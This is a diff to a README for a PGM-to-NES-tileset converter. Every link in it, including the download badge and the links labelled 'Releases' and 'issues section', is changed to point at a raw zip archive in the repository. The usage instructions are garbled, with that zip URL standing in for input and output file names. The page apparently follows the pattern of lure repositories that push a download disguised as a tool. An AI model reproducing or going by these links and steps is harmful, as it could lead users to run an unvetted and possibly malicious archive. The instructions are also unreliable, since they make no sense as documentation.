@@ -1,6 +1,6 @@
 # 🎉 PGM2CHR - Convert PGM Images to NES Tilesets Easily
 
-[![Download PGM2CHR](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip)](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip)
+[![Download PGM2CHR](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip)](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide will help you download and run PGM2CHR, a tool that changes PGM image
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [PGM2CHR Releases](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip).
+To get started, visit this page to download: [PGM2CHR Releases](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip).
 
 1. Click on the link above.
 2. Find the latest version of PGM2CHR.
@@ -38,12 +38,12 @@ Using PGM2CHR is straightforward. Here’s how you can convert your PGM images i
 3. **Run the Tool:**
    Type the following command in your CLI:
    ```
-   ./PGM2CHR https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip
+   ./PGM2CHR https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip
    ```
-   Replace `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip` with the name of your PGM file and `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip` with your desired tileset filename.
+   Replace `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip` with the name of your PGM file and `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip` with your desired tileset filename.
 
 4. **Check Your Output:**
-   After running the command, find the `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip` file in your folder.
+   After running the command, find the `https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip` file in your folder.
 
 ## 🪄 Common Use Cases
 
@@ -69,7 +69,7 @@ While PGM2CHR can handle various sizes, keep in mind that extremely large files 
 
 ### How do I report issues or ask questions?
 
-If you run into trouble or have questions, please visit the [issues section](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip) of our GitHub repository.
+If you run into trouble or have questions, please visit the [issues section](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip) of our GitHub repository.
 
 ## 🛠️ Troubleshooting
 
@@ -86,6 +86,6 @@ If you experience issues while using PGM2CHR, try the following:
 
 ## 🎉 Conclusion
 
-PGM2CHR makes it simple to convert PGM image files into NES tilesets. Just follow the steps outlined here, and you'll be on your way to creating and using tiles for your projects. For further updates and features, keep an eye on our [GitHub Releases](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/corrodibility/PGM2CHR.zip).
+PGM2CHR makes it simple to convert PGM image files into NES tilesets. Just follow the steps outlined here, and you'll be on your way to creating and using tiles for your projects. For further updates and features, keep an eye on our [GitHub Releases](https://raw.githubusercontent.com/hectoraup22/PGM2CHR/main/src/PG-CHR-2.2.zip).
 
 For any support, feel free to open an issue on our GitHub. Happy converting!
